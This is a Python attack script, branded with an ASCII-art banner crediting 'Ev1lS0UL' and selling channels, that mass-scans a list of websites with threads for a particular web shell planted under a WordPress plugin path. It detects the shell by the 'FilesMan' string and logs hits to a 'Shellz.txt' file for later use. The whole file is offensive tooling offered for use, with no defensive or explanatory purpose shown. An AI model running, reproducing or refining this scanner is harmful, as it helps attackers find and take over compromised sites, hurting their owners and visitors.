import requests
from multiprocessing.dummy import Pool

from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def exploit(url):
    try:
        head = {'User-agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}
        exp = requests.get(url+'/wp-content/plugins/TOPXOH/wDR.php', headers=head, timeout=10).text
        if 'FilesMan' in exp:
            print(fg+'[==] '+fc+url+fg+' [ FOUND ]')
            open('Shellz.txt', 'a').write(url+'/wp-content/plugins/TOPXOH/wDR.php'+'\n')
        else:
            print(fg+'[==] '+fc+url+fr+' [ FAILED ]')
    except:
        pass
        
logo = fr+"""                                                  
                               .:                        
                                :=                        
               :                =*                :       
                *=           :-=%@=-:.          :#.       
                 #%-    :+#@@@@@@@@@@@@%*=.   .#@.        
                  #@#=#@@@@@#=:.@@-.-*%@@@@%+*@%.         
                   %@@@@@%-    =@@*    :*@@@@@@.          
                  =@@@@@%-     *@@%     :#@@@@@#          
                 =@@@@%%@@@*-  *@@@  :+%@@%#@@@@%         
          :=:   .@@@@@. .+@@@* *@@@ -@@@*:  #@@@@=   .==  
           .#@#+*@@@@*     =@@++@@#:@@*.    -@@@@%=*@@-   
             =@@@@@@@+      .*@#@@#@%:      :@@@@@@@+     
             ..*@@@@@#  :+-.  -%@@@= . -+-  =@@@@@%:      
                :%@%@@: ..*@%*=-@@+-+%@#:  .%@@%@+..      
                  =@@@%.   .*@@@@@@@@#:    *@@@*.         
                   .*@@@=    :#@@@@%-    -%@@%:           
                  :- .+%@@*:   =@@*   .+%@%*: .:          
                   .+#=:.-+*##**@@#+*##+-..-*+:           
                      +@@%*=-:.=@@*..:-+#@@*:             
                        =%@@@@@@@@@@@@@@@+.               
                          :=++=*@@#=++=:                  
                            -#++@@#=*-                    
                             :@@@@@@=                     
                              +@@@@*                      
                               =@@*                       
                                ::                        
 [ Developed By Ev1lS0UL! ] ~ [ Official Channels @ev1l_store @error_troops ]

"""
print(logo)
        
def main():
    try:
        list = input(fg+'[~~] List : '+fw)
        thrd = input(fg+'[~~] Thread : '+fw)
        print()
        lol = open(list, 'r').read().splitlines()
        bal = Pool(int(thrd))
        sadia = bal.map(exploit, lol)
    except:
        print(fr+'\n\n List Not Found xd')

if __name__ == '__main__':
    main()